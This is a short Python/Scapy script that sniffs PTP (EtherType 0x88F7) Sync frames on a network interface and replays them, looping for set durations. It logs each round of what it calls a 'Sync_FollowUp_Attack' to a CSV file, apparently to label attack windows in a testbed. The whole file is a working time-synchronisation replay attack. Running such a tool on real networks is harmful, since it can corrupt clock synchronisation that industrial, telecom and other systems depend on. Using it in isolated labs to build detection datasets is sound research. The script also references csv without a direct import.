from scapy.all import *
from scapy.all import Ether
import time
import argparse
from functools import partial


def log_attack_start_end(attack_type, start_time, end_time, filename):
    # Open the file in append mode
    with open(filename, mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([attack_type, start_time, end_time])


def sync_filter(packet, interface):
    if Ether in packet:
        if packet[Ether].type == 35063:
            if packet.load[0] == 0:
                sendp(packet, iface = interface)


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')
parser.add_argument("-l", "--logs", help="specify the number of attack rounds", type = str)

args = parser.parse_args()
sniffer = partial(sync_filter, interface = args.interface)

while True:
    start_time = time.time()
    if args.sleep != None and args.duration!=None:
        sniff(iface=args.interface, prn = sniffer, timeout = args.duration)
        end_time = time.time()
        time.sleep(args.sleep)
    else:
        sniff(iface=args.interface, prn = sniffer)
        end_time = time.time()
    log_attack_start_end("Sync_FollowUp_Attack", start_time, end_time, args.logs)
